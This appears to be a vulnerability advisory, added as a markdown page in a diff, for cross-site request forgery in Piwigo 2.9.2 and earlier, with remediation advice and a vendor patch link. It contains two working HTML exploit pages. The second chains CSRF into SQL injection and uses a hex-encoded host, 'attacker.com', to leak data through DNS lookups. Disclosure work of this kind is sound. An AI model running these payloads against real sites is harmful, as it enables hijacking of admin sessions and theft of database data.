@@ -1,0 +1,102 @@
+-----
+layout: none
+-----
+
+## Cross Site Request Forgery in Piwigo 2.9.2
+
+<u>**Affected Version : <=2.9.2**</u>
+
+
+
+<u>**Description:**</u> 
+
+It was identified that admin panel of Piwigo application is vulnerable to [Cross Site Request Forgery](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)) vulnerabilities. An attacker can exploit these vulnerabilities to coerce user in performing unintended actions.
+
+
+
+<u>**Vulnerable Instances**</u>:
+
+- /admin.php?page=configuration&section=main
+
+
+
+<u>**Steps to Reproduce**</u>
+
+* Login to `admin` user account.
+* Save the following exploit in a new html file, example: `csrf_exploit.html`.
+
+**CSRF Exploit**
+
+```html
+<!-- csrf_exploit.html --> 
+<html>
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http:\/\/localhost\/piwigo-2.9.2\/piwigo\/admin.php?page=configuration&section=main", true);
+        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
+        xhr.withCredentials = true;
+        var body = "gallery_title=CSRF+ATTACK&page_banner=test+banner&order_by%5B%5D=date_available+DESC&order_by%5B%5D=file+ASC&order_by%5B%5D=id+ASC&rate_anonymous=on&allow_user_registration=on&allow_user_customization=on&week_starts_on=monday&history_guest=on&log=on&mail_theme=clear&submit=";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+      submitRequest();
+    </script>
+  </body>
+</html>
+```
+
+* Open the `csrf_exploit.html` file in the same browser in a new tab as of `admin` user has logged in.
+* Observe the title of application is changed to `CSRF ATTACK`.
+
+![csrf_poc](/assets/images/piwigo2.9.2/csrf.png)
+
+
+
+### Out of Band SQL Injection via CSRF
+
+Following `Exploit` shows that using above attack an attacker can exploit other vulnerabilities with in the application such as `SQL Injection` and exfiltrate data via DNS queries. 
+
+```html
+<!--Out of SQL Injection via CSRF-->
+<html>
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http:\/\/127.0.0.1\/piwigo-2.9.2\/piwigo\/admin.php?page=batch_manager&mode=unit", true);
+        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
+        xhr.withCredentials = true;
+        var body = "element_ids=12%2c13)+union+select+LOAD_FILE(group_concat(0x2f2f2f2f,(select+@@version_compile_os),0x2e61747461636b65722e636f6d2f2f6d7973716c5f65787472616374)),2+--+&name-12=funny+cat+5-wallpaper-1920x1080&author-12=this+is+test&date_creation-12=2016-11-24+00%3A00%3A00&level-12=0&tags-12%5B%5D=this+is+test&description-12=this+is+test&name-13=pirates+of+the+caribbean+dead+men+tell+no+tales-wallpaper-960x600&author-13=this+is+test2&date_creation-13=2016-11-23+00%3A00%3A00&level-13=0&tags-13%5B%5D=this+is+test2&description-13=this+is+test2&submit=Submit";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+      submitRequest();
+    </script>
+  </body>
+</html>
+```
+
+![csrf_dns](/assets/images/piwigo2.9.2/csrf_2.png)
+
+
+
+<u>**Remediation:**</u>
+
+Piwigo 2.9.2 application implements CSRF attack protection via `_csrf`  tokens in number of components, it is recommended to implement similar protection for `Configuration` components. Addition information on CSRF Prevention techniques can be found [here](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)).
+
+**<u>Vendor Patches:</u>**
+
+The patch released by vendor for this issue can be found [here](https://github.com/Piwigo/Piwigo/commit/c3b4c6f7f0ddeaea492080fb8211d7b4cfedaf6f) 
+
